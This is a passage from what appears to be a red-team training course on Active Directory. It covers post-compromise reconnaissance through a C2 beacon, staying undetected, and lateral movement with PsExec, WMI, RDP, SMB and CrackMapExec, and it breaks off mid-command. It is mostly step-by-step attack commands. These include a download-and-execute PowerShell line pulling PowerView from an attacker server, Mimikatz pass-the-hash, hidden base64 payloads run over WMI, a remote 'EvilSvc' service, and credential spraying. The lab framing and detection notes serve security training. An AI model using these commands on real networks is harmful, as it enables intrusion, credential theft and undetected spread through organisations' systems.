Initial Host and Domain Reconnaissance Post-Compromise</h3>\n<p>Okay, we have our beacon. We are <em>inside</em>. Now, we need to figure out <em>where</em> inside we are and what&#39;s around us. Initial reconnaissance is about answering fundamental questions about the compromised host and its immediate network/domain environment.</p>\n<p><strong>Goal:</strong> Gather enough information to understand our current position, identify potential next steps (privilege escalation paths, lateral movement targets), and locate initial points of interest (shares, logged-in users, domain controllers).</p>\n<h4>3.1 Performing Initial Host Reconnaissance</h4>\n<p>Focus on understanding the specific machine the beacon is running on:</p>\n<ul>\n<li><strong>System Information:</strong><ul>\n<li>Hostname: <code>shell hostname</code></li>\n<li>Operating System (Version, Build, Architecture - 32/64-bit): <code>shell systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</code></li>\n<li>Installed Patches (Can reveal unpatched vulnerabilities): <code>shell wmic qfe get HotfixID,InstalledOn</code></li>\n<li>Network Configuration (IPs, Subnets, DNS Servers): <code>shell ipconfig /all</code></li>\n<li>Routing Table: <code>shell route print</code></li>\n<li>Firewall Status/Rules (Basic Check): <code>shell netsh advfirewall show allprofiles state</code></li>\n</ul>\n</li>\n<li><strong>User and Process Information:</strong><ul>\n<li>Current User and Privileges: <code>shell whoami /all</code> or <code>getuid</code> (C2 command)</li>\n<li>Logged-on Users: <code>shell query user</code> or <code>shell quser</code></li>\n<li>Running Processes (Identify AV/EDR, admin tools, interesting applications): <code>shell tasklist /svc</code> or <code>shell Get-Process</code> (PowerShell)</li>\n<li>Network Connections (Identify active connections, listening ports - can reveal C2, RDP, shares): <code>shell netstat -ano</code></li>\n</ul>\n</li>\n<li><strong>File System and Configuration:</strong><ul>\n<li>Drive Mappings/Shares: <code>shell net use</code> or <code>shell Get-PSDrive -PSProvider FileSystem</code> (PowerShell)</li>\n<li>Installed Software (Look for security tools, development tools, specific business apps): <code>shell wmic product get name,version</code> or <code>shell Get-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | Get-ItemProperty | Select-Object DisplayName, DisplayVersion, Publisher</code> (PowerShell)</li>\n<li>Interesting Files (Config files, script files, user directories): Use <code>ls</code>, <code>dir</code>, <code>findstr</code>, <code>Select-String</code>. <em>Be careful being too noisy here initially.</em></li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step Example (using generic beacon commands):</strong></p>\n<ol>\n<li>Get basic system info:<pre><code class=\"language-bash\">beacon&gt; shell systeminfo\n</code></pre>\n</li>\n<li>Check network config:<pre><code class=\"language-bash\">beacon&gt; shell ipconfig /all\n</code></pre>\n</li>\n<li>List running processes:<pre><code class=\"language-bash\">beacon&gt; shell tasklist /svc\n</code></pre>\n</li>\n<li>Check logged on users:<pre><code class=\"language-bash\">beacon&gt; shell query user\n</code></pre>\n</li>\n<li>See current user context and privileges:<pre><code class=\"language-bash\">beacon&gt; shell whoami /all\n</code></pre>\n</li>\n<li>(Optional, if PowerShell is preferred/available) Use PowerShell for more structured data:<pre><code class=\"language-bash\">beacon&gt; powershell Get-ComputerInfo | Select-Object OsName, OsVersion, OsHardwareAbstractionLayer\nbeacon&gt; powershell Get-NetIPConfiguration\nbeacon&gt; powershell Get-Process | Where-Object {$_.MainWindowTitle} # List processes with windows (often user applications)\n</code></pre>\n</li>\n</ol>\n<h4>3.2 Performing Initial Domain Reconnaissance</h4>\n<p>Now, expand your view to the Active Directory domain the host belongs to:</p>\n<ul>\n<li><strong>Domain and Forest Name:</strong> <code>shell whoami /fqdn</code> or <code>shell echo %userdomain%</code></li>\n<li><strong>Domain Controller(s):</strong> <code>shell nltest /dclist:</code> or <code>shell Get-ADDomainController -Discover</code> (PowerShell - requires RSAT or specific modules)</li>\n<li><strong>Current User&#39;s Group Memberships:</strong> <code>shell whoami /groups</code> or <code>shell Get-ADUser -Identity $env:USERNAME -Properties MemberOf | Select-Object -ExpandProperty MemberOf</code> (PowerShell)</li>\n<li><strong>Identify Domain Admins (or other high-value groups):</strong> <code>shell net group &quot;Domain Admins&quot; /domain</code></li>\n<li><strong>Basic Domain/Forest Structure (Optional, can be noisy):</strong> <code>shell net view /domain</code> (lists domains/workgroups), <code>shell net view /forest</code> (lists domains in the forest).</li>\n<li><strong>Initial GPO Information:</strong> <code>shell gpresult /r</code> (Shows GPOs applied to the current user and computer - look for interesting scripts, software deployments).</li>\n</ul>\n<p><strong>Step-by-Step Example (using generic beacon commands):</strong></p>\n<ol>\n<li>Find the domain and current user&#39;s full name:<pre><code class=\"language-bash\">beacon&gt; shell whoami /fqdn\n</code></pre>\n</li>\n<li>List Domain Controllers:<pre><code class=\"language-bash\">beacon&gt; shell nltest /dclist:\n</code></pre>\n</li>\n<li>Check current user&#39;s domain group memberships:<pre><code class=\"language-bash\">beacon&gt; shell whoami /groups\n</code></pre>\n</li>\n<li>See who is in the Domain Admins group (requires appropriate permissions, might fail):<pre><code class=\"language-bash\">beacon&gt; shell net group &quot;Domain Admins&quot; /domain\n</code></pre>\n</li>\n<li>Check applied GPOs:<pre><code class=\"language-bash\">beacon&gt; shell gpresult /r\n</code></pre>\n</li>\n</ol>\n<h4>3.3 Internal Reconnaissance Tools and Techniques</h4>\n<p>While built-in commands are great for stealthy basics, dedicated tools automate and deepen this process:</p>\n<ul>\n<li><strong>PowerShell Scripts:</strong> <code>PowerView.ps1</code> (part of PowerSploit) is a classic. It has functions for querying users, groups, computers, OUs, GPOs, trusts, etc., directly from Active Directory using PowerShell.<pre><code class=\"language-bash\"># Example: Load PowerView and get domain computers (requires loading script first)\nbeacon&gt; powershell -command &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://&lt;your_web_server&gt;/PowerView.ps1&#39;); Get-NetComputer -OperatingSystem &#39;*server*&#39;&quot;\n</code></pre>\n</li>\n<li><strong>C# Assemblies:</strong> Tools like <code>Seatbelt</code> (host recon) and <code>SharpHound</code> (data collector for BloodHound) are often executed via <code>execute-assembly</code>.<pre><code class=\"language-bash\"># Example: Run SharpHound to collect BloodHound data (requires SharpHound.exe)\nbeacon&gt; execute-assembly /path/to/local/SharpHound.exe --collectionmethods All\n</code></pre>\n<em>Note: Running <code>SharpHound</code> can be noisy as it queries AD extensively. Use judiciously.</em></li>\n<li><strong>C2 Integrated Modules:</strong> Many C2s have built-in commands that wrap these tools or perform similar functions (<code>net</code>, <code>ad</code> commands in Cobalt Strike, Covenant&#39;s built-in modules).</li>\n</ul>\n<p><strong>Key Takeaway:</strong> Initial recon is iterative. You gather some info, analyze it, decide what <em>else</em> you need to know, and run more commands/tools. Document <em>everything</em>.</p>\n<h3>Section 4: Who Are We? - Understanding Privileges and User Context</h3>\n<p>We&#39;ve already touched upon this with <code>whoami /all</code>, but it&#39;s so critical it deserves its own point.</p>\n<ul>\n<li>Your beacon runs in the context of the user account that executed the initial payload. This might be a standard user, a local administrator, or even a system account.</li>\n<li>The privileges and group memberships of this account dictate what you can do on the <em>current host</em> and what you can query or access in the <em>domain</em>.</li>\n<li><code>whoami /priv</code> shows your <em>privileges</em> (like <code>SeDebugPrivilege</code>, <code>SeBackupPrivilege</code>), which are distinct from group memberships and grant powerful system-level abilities.</li>\n<li><code>whoami /groups</code> shows the groups you belong to. Domain groups are key for accessing network resources and performing domain-wide actions. Local groups are key for host-level actions.</li>\n</ul>\n<p><strong>Why is this important now?</strong></p>\n<ul>\n<li>It tells you immediately what techniques are available. If you have <code>SeDebugPrivilege</code>, you can likely dump LSASS (Module 3). If you are in a local <code>Administrators</code> group, you can likely install services or modify registry keys for persistence (Module 5). If you are in <code>Domain Users</code>, your options are more limited, and you&#39;ll need to focus on privilege escalation paths.</li>\n<li>It helps identify potential lateral movement paths. Is the current user a local admin on other machines? Are they in a group that has RDP access to servers?</li>\n</ul>\n<p><strong>Action:</strong> Always run <code>whoami /all</code> or similar early on and carefully analyze the output.</p>\n<h3>Section 5: Initial Operational Security (OpSec) Considerations</h3>\n<p>We touched on this briefly, but let&#39;s reinforce it. Your primary goal in this phase is to establish a stable foothold and gather information <em>without being detected</em>.</p>\n<ul>\n<li><strong>Avoid Noise:</strong> Running aggressive network scanners or dumping credentials on every host right away is a fast way to get caught.</li>\n<li><strong>Use Trusted Processes:</strong> If possible, inject into or migrate to legitimate processes (<code>explorer.exe</code>, <code>svchost.exe</code> - though be careful with the latter) rather than running from suspicious process names or locations. (More on this in Module 7, but keep the concept in mind).</li>\n<li><strong>Built-in Tools First:</strong> Leverage <code>cmd.exe</code>, <code>powershell.exe</code>, <code>wmic.exe</code>, <code>net.exe</code>, <code>nltest.exe</code>, <code>gpresult.exe</code>. These are standard binaries defenders see all the time. Anomalous <em>usage</em> (e.g., <code>nltest</code> run from a user workstation not by an admin) can be an indicator, but it&#39;s less suspicious than a custom binary.</li>\n<li><strong>Understand Logging:</strong> Be aware that your commands are likely being logged via Event Tracing for Windows (ETW), PowerShell logging, or command-line logging. Running tools in memory can help, but defenders are getting better at detecting in-memory threats.</li>\n</ul>\n<p>This module is about getting in and looking around. Keep a low profile while you do it.</p>\n<h3>Module Summary</h3>\n<p>In Module 1, we&#39;ve set the stage for advanced AD red teaming. We quickly reviewed the core AD components that matter most to an attacker and placed ourselves within the red team operational lifecycle. We introduced the necessity of advanced C2 frameworks for resilient post-exploitation and learned how to interact with a beacon, focusing on basic tasking and initial OpSec. Finally, we covered essential host and domain reconnaissance techniques using both built-in Windows commands and the concept of leveraging more advanced scripts/tools via the beacon, emphasizing the critical importance of understanding our user context and privileges.</p>\n<p>You now have the foundational knowledge to establish your presence and begin mapping the environment from the inside.</p>\n<hr>\n<h3>Suggested Resources or Prerequisites</h3>\n<ul>\n<li>Review Microsoft documentation on Active Directory concepts (Users, Groups, Domains, Trusts, GPOs).</li>\n<li>Practice using <code>cmd.exe</code> and <code>powershell.exe</code> for basic system and network information gathering.</li>\n<li>Set up your lab environment! This is crucial. A simple AD domain with a few member servers/workstations is sufficient.</li>\n<li>Explore the documentation for an open-source C2 framework like Covenant or Mythic, or obtain access to a commercial one like Cobalt Strike or Brute Ratel if possible. Familiarize yourself with its basic console/UI.</li>\n<li>Have <code>PowerView.ps1</code> and <code>SharpHound.exe</code> available locally on your C2 server, ready to be uploaded/executed.</li>\n</ul>\n<hr>\n<h3>Module 1 Project/Exercise: Establishing Foothold &amp; Initial Recon</h3>\n<p>This is where theory meets practice. You <em>must</em> do this hands-on in your lab environment.</p>\n<p><strong>Objective:</strong> Establish a stable C2 beacon connection on a target machine within your lab AD environment. Perform detailed host and domain reconnaissance using both built-in tools (<code>shell</code> or <code>powershell</code> commands) and potentially loading a reconnaissance script/tool. Map initial user privileges and local network connections. Document initial findings for later use.</p>\n<p><strong>Scenario:</strong> Assume you have successfully executed your C2 payload on a Windows member server or workstation in your lab domain. A beacon has checked back to your C2 server.</p>\n<p><strong>Tasks:</strong></p>\n<ol>\n<li><strong>Establish Beacon Interaction:</strong> Confirm you can interact with the beacon using basic commands (<code>help</code>, <code>info</code>, <code>pwd</code>, <code>ls</code>). Understand the asynchronous nature of the C2.</li>\n<li><strong>Perform Host Reconnaissance:</strong><ul>\n<li>Run at least 5-7 different built-in Windows commands (<code>shell</code> or <code>powershell</code>) via the beacon to gather information about the compromised host. Examples: <code>hostname</code>, <code>ipconfig /all</code>, <code>systeminfo</code>, <code>tasklist /svc</code>, <code>netstat -ano</code>, <code>wmic qfe get HotfixID</code>, <code>query user</code>.</li>\n<li>Identify the operating system, IP address(es), and any running security software processes (even if simulated).</li>\n</ul>\n</li>\n<li><strong>Perform Domain Reconnaissance:</strong><ul>\n<li>Run at least 3-5 different built-in Windows commands (<code>shell</code> or <code>powershell</code>) via the beacon to gather initial domain information. Examples: <code>whoami /fqdn</code>, <code>nltest /dclist:</code>, <code>net group &quot;Domain Admins&quot; /domain</code>, <code>gpresult /r</code>.</li>\n<li>Identify the domain name, at least one Domain Controller, and the groups the current user belongs to.</li>\n</ul>\n</li>\n<li><strong>Understand Privileges:</strong><ul>\n<li>Run <code>shell whoami /all</code> and analyze the output.</li>\n<li>Document the username, domain, and key privileges/group memberships of the compromised user context.</li>\n</ul>\n</li>\n<li><strong>(Optional but Recommended) Use an Automated Tool:</strong> If comfortable and the lab setup allows, attempt to load and execute <code>PowerView.ps1</code> or <code>SharpHound.exe</code> (via <code>powershell</code> or <code>execute-assembly</code> respectively) to automate some of the recon steps. Be mindful of potential noise.</li>\n<li><strong>Document Initial Findings:</strong> Create a simple text file or markdown document summarizing your findings:<ul>\n<li>Compromised Host Details (Hostname, OS, IP)</li>\n<li>User Context (Username, Domain, Key Groups/Privileges)</li>\n<li>Identified Domain Controllers</li>\n<li>Any initial points of interest discovered (e.g., shares listed by <code>net use</code>, interesting processes, applied GPOs).</li>\n<li>List the commands/techniques you used.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Deliverable:</strong> Your documentation file containing the summarized findings and the commands used. Be prepared to explain your process.</p>\n<p>This exercise is your first hands-on step into operating from within a target network using advanced tools. Focus on understanding the output of your commands and how it helps you build a picture of the environment.</p>\n<hr>\n<p>Fantastic work, team! You&#39;ve now got your initial foothold secured (conceptually and practically in your lab) and started gathering intelligence from the inside. This reconnaissance is the bedrock for everything that follows. In our next module, we&#39;ll take this intelligence and learn how to move laterally through the network, expanding our reach and getting closer to our objectives.</p>\n<p>See you in Module 2: Lateral Movement and Trust Exploitation!</p>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s dive deep into the veins and arteries of the Active Directory network – Lateral Movement and Trust Exploitation! This is where the real fun begins after gaining that initial foothold. We&#39;ll learn how to spread our influence, navigate the network, and potentially bridge gaps between different parts of the organization.</p>\n<p>As your guide, I&#39;m thrilled to share the intricacies of moving stealthily and effectively through a compromised AD environment. Think of this module as learning how to walk, run, and eventually teleport within the target network using the credentials and access we&#39;ve started to gather.</p>\n<hr>\n<h2>Module 2: Lateral Movement and Trust Exploitation</h2>\n<ul>\n<li><strong>Module Objective:</strong> Learn and practice various techniques for moving laterally between compromised hosts and leveraging domain/forest trusts to expand access across the network.</li>\n</ul>\n<hr>\n<h3>2.1 Introduction: The Art of the Pivot</h3>\n<p>Welcome back! In Module 1, we established our initial foothold and got our beacon talking. Now, we face a fundamental challenge in almost any red team operation: our initial access is rarely on the most valuable target. We need to move deeper into the network, reach high-value assets like Domain Controllers, file servers, or critical application servers. This movement from one compromised host to another is known as <strong>Lateral Movement</strong>.</p>\n<p>But networks aren&#39;t always flat. Organizations often use multiple domains, sometimes even multiple forests, connected by <strong>Trusts</strong>. Understanding and exploiting these trusts allows us to potentially jump from a less secure domain to a more secure one, expanding our reach significantly.</p>\n<p>This module is about mastering the techniques to achieve this necessary network traversal, both within a single domain and across trusting boundaries.</p>\n<p><strong>Why is Lateral Movement Crucial?</strong></p>\n<ol>\n<li><strong>Reaching Objectives:</strong> High-value data, critical systems, and domain dominance are rarely on the initial target.</li>\n<li><strong>Establishing Persistence:</strong> Spreading access makes it harder for defenders to completely remove you.</li>\n<li><strong>Gathering Intelligence:</strong> Accessing more machines means finding more credentials, data, and network information.</li>\n<li><strong>Simulating Real Threats:</strong> Advanced persistent threats (APTs) and sophisticated attackers <em>always</em> use lateral movement.</li>\n</ol>\n<p><strong>Key Concepts We&#39;ll Cover:</strong></p>\n<ul>\n<li>Common Windows protocols and features abused for lateral movement.</li>\n<li>Leveraging your C2 framework&#39;s built-in capabilities.</li>\n<li>Mapping and understanding Active Directory trusts.</li>\n<li>Exploiting trust relationships for cross-domain access.</li>\n<li>Network pivoting techniques (SOCKS, Port Forwards) to reach otherwise inaccessible segments.</li>\n</ul>\n<p>Let&#39;s get started!</p>\n<hr>\n<h3>2.2 Common Lateral Movement Techniques</h3>\n<p>Windows provides numerous built-in features and protocols designed for remote administration, file sharing, and inter-process communication. Unfortunately, these are also powerful tools for attackers armed with valid credentials (stolen, cracked, or defaulted). We&#39;ll explore the most common ones.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>Valid credentials (username and password or NTLM hash) for a user with local administrator privileges on the target host, or potentially credentials for a user with fewer privileges depending on the technique and target configuration.</li>\n<li>Network connectivity from your current beacon/host to the target host on the necessary ports.</li>\n</ul>\n<h4>2.2.1 PsExec</h4>\n<ul>\n<li><strong>Concept:</strong> PsExec is a Sysinternals tool (now Microsoft) that allows you to execute processes on remote systems. It works by creating a temporary Windows service on the target machine, copying the executable over via SMB (ADMIN$ share), running it, and then cleaning up the service and file.</li>\n<li><strong>How Attackers Use It:</strong> PsExec is the &quot;Swiss Army Knife&quot; of lateral movement due to its simplicity and effectiveness when local admin rights are available. It&#39;s commonly used to get a shell (cmd, PowerShell) or execute payloads remotely.</li>\n<li><strong>Why it&#39;s Useful:</strong> Widely available (often already on systems), simple command-line interface, reliable.</li>\n<li><strong>OpSec Considerations:</strong><ul>\n<li>Creates a service (<code>PsExecSvc</code> or similar) which is a high-fidelity detection artifact (Event ID 7045).</li>\n<li>Writes an executable file (<code>PSEXEC.EXE</code>, <code>PSEXESVC.EXE</code>, or random name) to <code>C:\\Windows</code> on the target, another strong artifact.</li>\n<li>Generates significant SMB traffic to <code>ADMIN$</code>.</li>\n<li>Parent-child process relationships can be suspicious (e.g., <code>services.exe</code> spawning <code>cmd.exe</code> or <code>powershell.exe</code>).</li>\n</ul>\n</li>\n<li><strong>Detection:</strong><ul>\n<li><strong>Event Logs:</strong> Event ID 7045 (Service Install), 4624 (Successful Logon - Type 3, Network), 5140/5145 (Network Share Access), 4688 (Process Creation - look for <code>PsExecSvc.exe</code> or suspicious parent/child).</li>\n<li><strong>File Monitoring:</strong> Creation of <code>PsExecSvc.exe</code> or similar in <code>C:\\Windows</code>.</li>\n<li><strong>Network Traffic:</strong> SMB traffic to <code>ADMIN$</code>.</li>\n<li><strong>EDR/AV:</strong> Behavioral detection rules looking for the PsExec sequence.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step (Using Command Line):</strong></p>\n<ol>\n<li><strong>Check Access:</strong> Ensure you have credentials and network access.</li>\n<li><strong>Execute PsExec:</strong><ul>\n<li>Using password:<pre><code class=\"language-bash\">psexec.exe \\\\&lt;target_host_ip_or_name&gt; -u &lt;domain&gt;\\&lt;username&gt; -p &lt;password&gt; cmd.exe\n</code></pre>\n</li>\n<li>Using NTLM hash (Pass-the-Hash, requires Mimikatz or similar capability):<pre><code class=\"language-bash\"># Requires elevated context or specific tools\n# Using Mimikatz pth command (must be run on a system where you have a shell/beacon)\n# This doesn&#39;t run psexec directly, but injects the hash for processes run *from that shell*\nmimikatz# sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:&quot;cmd.exe&quot;\n# Then, from the new cmd window that opens:\npsexec.exe \\\\&lt;target_host_ip_or_name&gt; cmd.exe\n</code></pre>\n</li>\n<li>Running as SYSTEM (<code>-s</code> switch):<pre><code class=\"language-bash\">psexec.exe \\\\&lt;target_host_ip_or_name&gt; -u &lt;domain&gt;\\&lt;username&gt; -p &lt;password&gt; -s cmd.exe\n</code></pre>\n<em>Note:</em> Running as SYSTEM is powerful but often requires administrator privileges on the target <em>even if</em> you provide different user credentials with <code>-u</code>. The <code>-s</code> switch changes the context <em>on the target</em> after successful authentication.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Step-by-Step (Using a C2 Framework - Generic Example):</strong></p>\n<p>Most C2s abstract this. You&#39;ll typically have a command like <code>psexec</code> or <code>jump psexec</code>.</p>\n<ol>\n<li><strong>Select Beacon:</strong> Interact with the beacon on the source host.</li>\n<li><strong>Run PsExec Command:</strong><pre><code class=\"language-c2\">beacon&gt; psexec &lt;target_host_ip_or_name&gt; &lt;listener_name&gt;\n</code></pre>\n<em>Explanation:</em> This command tells the current beacon (<code>beacon&gt;</code>) to use PsExec with its internal capabilities (often doesn&#39;t use the <code>psexec.exe</code> file directly, improving stealth slightly) to execute a payload associated with <code>&lt;listener_name&gt;</code> on the target. The payload will connect back to your C2 server, giving you a new beacon on the target host.</li>\n</ol>\n<h4>2.2.2 WMI (Windows Management Instrumentation)</h4>\n<ul>\n<li><strong>Concept:</strong> WMI is Microsoft&#39;s implementation of Web-Based Enterprise Management (WBEM). It&#39;s used for querying information and performing administrative tasks on local and remote Windows systems.</li>\n<li><strong>How Attackers Use It:</strong> WMI can be used to execute commands remotely, often via the <code>Win32_Process</code> class&#39;s <code>Create</code> method. It can also be used for reconnaissance and persistence.</li>\n<li><strong>Why it&#39;s Useful:</strong> Built into Windows, often less monitored than PsExec, can execute commands without dropping files to disk (depending on the payload method).</li>\n<li><strong>OpSec Considerations:</strong><ul>\n<li>Generates WMI network traffic (often over RPC/DCOM ports).</li>\n<li>Creates processes on the target, but the parent process is typically <code>WmiPrvSE.exe</code>, which is a legitimate WMI host process. Suspicious child processes spawned by <code>WmiPrvSE.exe</code> are a detection point.</li>\n<li>Can be used for persistence via WMI Event Consumers/Filters (covered in Module 5).</li>\n</ul>\n</li>\n<li><strong>Detection:</strong><ul>\n<li><strong>Event Logs:</strong> WMI activity logs (Event ID 5857, 5858, 5859, 5860, 5861 - requires specific logging configuration), Event ID 4624 (Logon Type 3), 4688 (Process Creation - look for <code>WmiPrvSE.exe</code> spawning suspicious processes like <code>cmd.exe</code>, <code>powershell.exe</code>, or your payload).</li>\n<li><strong>Network Traffic:</strong> DCOM/RPC traffic patterns.</li>\n<li><strong>EDR/AV:</strong> Behavioral analysis looking for <code>WmiPrvSE.exe</code> spawning unusual child processes.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step (Using Command Line/PowerShell):</strong></p>\n<ol>\n<li><p><strong>Using <code>wmic</code> (older, but sometimes useful):</strong></p>\n<pre><code class=\"language-bash\">wmic /node:&quot;&lt;target_host_ip_or_name&gt;&quot; process call create &quot;cmd.exe /c &lt;command_to_execute&gt;&quot;\n</code></pre>\n<p><em>Example:</em> <code>wmic /node:&quot;192.168.1.101&quot; process call create &quot;cmd.exe /c whoami &gt; c:\\temp\\whoami.txt&quot;</code></p>\n</li>\n<li><p><strong>Using PowerShell (Recommended):</strong></p>\n<pre><code class=\"language-powershell\">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -nop -w hidden -c &lt;payload_command&gt;&quot; -ComputerName &lt;target_host_ip_or_name&gt; -Credential (Get-Credential)\n</code></pre>\n<p><em>Explanation:</em> This prompts for credentials. You can also pass credentials more directly if they are already available, though handling credentials securely in scripts requires care. The <code>-ArgumentList</code> contains the command to execute remotely.<br><em>Example (executing a base64 encoded PowerShell payload):</em></p>\n<pre><code class=\"language-powershell\">$payload = &quot;powershell.exe -nop -w hidden -c &lt;your_base64_payload&gt;&quot;\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $payload -ComputerName 192.168.1.101 -Credential (Get-Credential) # Or pass stored credentials\n</code></pre>\n</li>\n</ol>\n<p><strong>Step-by-Step (Using a C2 Framework - Generic Example):</strong></p>\n<p>Similar to PsExec, C2s often have <code>wmi</code> or <code>jump wmi</code> commands.</p>\n<ol>\n<li><strong>Select Beacon:</strong> Interact with the beacon on the source host.</li>\n<li><strong>Run WMI Command:</strong><pre><code class=\"language-c2\">beacon&gt; wmi &lt;target_host_ip_or_name&gt; &lt;listener_name&gt;\n</code></pre>\n<em>Explanation:</em> Executes a payload via WMI on the target host, connecting back to your listener.</li>\n</ol>\n<h4>2.2.3 RDP (Remote Desktop Protocol)</h4>\n<ul>\n<li><strong>Concept:</strong> RDP provides an interactive graphical or console session to a remote Windows machine.</li>\n<li><strong>How Attackers Use It:</strong> If you have credentials for a user who is allowed to RDP to a machine (e.g., a local administrator, a domain admin), you can log in directly. Useful for interactive tasks, accessing files, or running tools directly on the target.</li>\n<li><strong>Why it&#39;s Useful:</strong> Full interactive access, familiar interface.</li>\n<li><strong>OpSec Considerations:</strong><ul>\n<li>Creates a visible interactive logon session (Type 10 logon event).</li>\n<li>Generates RDP network traffic (default port 3389).</li>\n<li>The interactive nature can be risky if defenders are actively monitoring sessions.</li>\n</ul>\n</li>\n<li><strong>Detection:</strong><ul>\n<li><strong>Event Logs:</strong> Event ID 4624 (Successful Logon - Type 10, RemoteInteractive), 4625 (Failed Logon), 4776 (Credential Validation), RDP specific logs.</li>\n<li><strong>Network Traffic:</strong> RDP traffic (port 3389).</li>\n<li><strong>Session Monitoring:</strong> Defenders can see active RDP sessions.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step (Using Built-in Client):</strong></p>\n<ol>\n<li><strong>Open RDP Client:</strong> Press <code>Win + R</code>, type <code>mstsc</code>, and press Enter.</li>\n<li><strong>Enter Target:</strong> Type the IP address or hostname of the target machine.</li>\n<li><strong>Enter Credentials:</strong> Click &quot;Show Options&quot;, go to the &quot;Display&quot; tab (optional), then the &quot;Advanced&quot; tab (optional). Click &quot;Connect&quot;. You will be prompted for credentials. Enter <code>&lt;domain&gt;\\&lt;username&gt;</code> and the password.</li>\n</ol>\n<p><strong>Step-by-Step (Using a C2 Framework - Generic Example):</strong></p>\n<p>C2s might offer ways to facilitate RDP access, such as enabling RDP if disabled, adding users to the Remote Desktop Users group (requires admin), or providing the necessary credentials. Some might even have built-in RDP clients or allow tunneling RDP over the beacon (see Pivoting).</p>\n<ol>\n<li><strong>Enable RDP (if needed and you have admin):</strong><pre><code class=\"language-c2\">beacon&gt; rdp enable\n</code></pre>\n</li>\n<li><strong>Add User to Remote Desktop Users (if needed and you have admin):</strong><pre><code class=\"language-c2\">beacon&gt; net localgroup &quot;Remote Desktop Users&quot; &lt;domain&gt;\\&lt;username&gt; /add\n</code></pre>\n</li>\n<li><strong>Provide Credentials (for manual RDP):</strong> C2s can store and retrieve credentials collected from the environment.</li>\n</ol>\n<h4>2.2.4 SMB (Server Message Block)</h4>\n<ul>\n<li><strong>Concept:</strong> SMB is a network file sharing protocol used by Windows for shared access to files, printers, and serial ports, as well as for Inter-Process Communication (IPC$).</li>\n<li><strong>How Attackers Use It:</strong> SMB is fundamental to many other techniques (PsExec, accessing ADMIN$/C$ shares). Attackers directly use it to:<ul>\n<li>Access shared folders (including administrative shares like C$, ADMIN$).</li>\n<li>Copy tools or payloads to target machines.</li>\n<li>Execute commands indirectly (e.g., copying a script and then using <code>schtasks</code> or <code>wmic</code> to run it).</li>\n<li>Perform reconnaissance (listing shares, checking file permissions).</li>\n</ul>\n</li>\n<li><strong>Why it&#39;s Useful:</strong> Universal in Windows networks, required by many other lateral movement methods.</li>\n<li><strong>OpSec Considerations:</strong><ul>\n<li>Generates SMB network traffic (ports 445 and 139).</li>\n<li>File creation/modification on remote shares is logged (Event ID 5140/5145).</li>\n<li>Accessing administrative shares like ADMIN$ or C$ is highly suspicious if not part of normal administration.</li>\n</ul>\n</li>\n<li><strong>Detection:</strong><ul>\n<li><strong>Event Logs:</strong> Event ID 4624 (Logon Type 3), 5140 (Network Share Access), 5145 (Network Share Object Access).</li>\n<li><strong>Network Traffic:</strong> SMB traffic analysis, especially connections to administrative shares or unusual file operations.</li>\n<li><strong>EDR/AV:</strong> Monitoring file system activity on shared drives.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step (Using Command Line):</strong></p>\n<ol>\n<li><p><strong>Map a Share (using credentials):</strong></p>\n<pre><code class=\"language-bash\">net use \\\\&lt;target_host_ip_or_name&gt;\\c$ &lt;password&gt; /user:&lt;domain&gt;\\&lt;username&gt;\n</code></pre>\n<p><em>Explanation:</em> This maps the C drive of the target host as a network drive (e.g., Z:) on your current system <em>if</em> run locally. If run from a compromised host&#39;s shell, it creates the network connection from that host.<br><em>Example:</em> <code>net use \\\\192.168.1.101\\c$ P@sswOrd123 /user:corp\\adminuser</code></p>\n</li>\n<li><p><strong>Access the Share:</strong> Once mapped or connected, you can interact with it like a local drive (e.g., <code>copy evil.exe \\\\192.168.1.101\\c$\\temp\\</code>).</p>\n</li>\n<li><p><strong>Using IPC$ for Remote Service Creation (manual PsExec-like):</strong></p>\n<pre><code class=\"language-bash\"># This is conceptually how tools like PsExec work behind the scenes\nnet use \\\\&lt;target_host_ip_or_name&gt;\\IPC$ &lt;password&gt; /user:&lt;domain&gt;\\&lt;username&gt;\n# Then use sc.exe to create/start a service\nsc \\\\&lt;target_host_ip_or_name&gt; create EvilSvc binPath=&quot;cmd /c &lt;command&gt;&quot; start= auto\nsc \\\\&lt;target_host_ip_or_name&gt; start EvilSvc\n# Clean up later:\nsc \\\\&lt;target_host_ip_or_name&gt; stop EvilSvc\nsc \\\\&lt;target_host_ip_or_name&gt; delete EvilSvc\nnet use \\\\&lt;target_host_ip_or_name&gt;\\IPC$ /delete\n</code></pre>\n</li>\n</ol>\n<p><strong>Step-by-Step (Using Tools like CrackMapExec):</strong></p>\n<p>CrackMapExec (<code>cme</code>) is a versatile Python tool for interacting with SMB, LDAP, and other services across a network, often used for credential testing and lateral movement.</p>\n<ol>\n<li><p><strong>Test Credentials via SMB:</strong></p>\n<pre><code class=\"language-bash\">cme smb &lt;target_ip_range&gt; -u &lt;username&gt; -p &lt;password&gt;\n</code></pre>\n<p><em>Example:</em> <code>cme smb 192.168.1.0/24 -u jsmith -p Summer2023!</code></p>\n</li>\n<li><p><strong>Execute Command via SMB (using <code>smbexec</code> or <code>wmiexec</code> modules):</strong></p>\n<pre><code class=\"language-bash\">cme smb &lt;target_ip&gt; -u &lt;username&gt; -p &lt;password&gt; -x &quot;whoami&quot;\n# or using hash:\ncme smb &lt;target_ip&gt; -u &lt;username&gt; -H &lt;hash&gt; -x 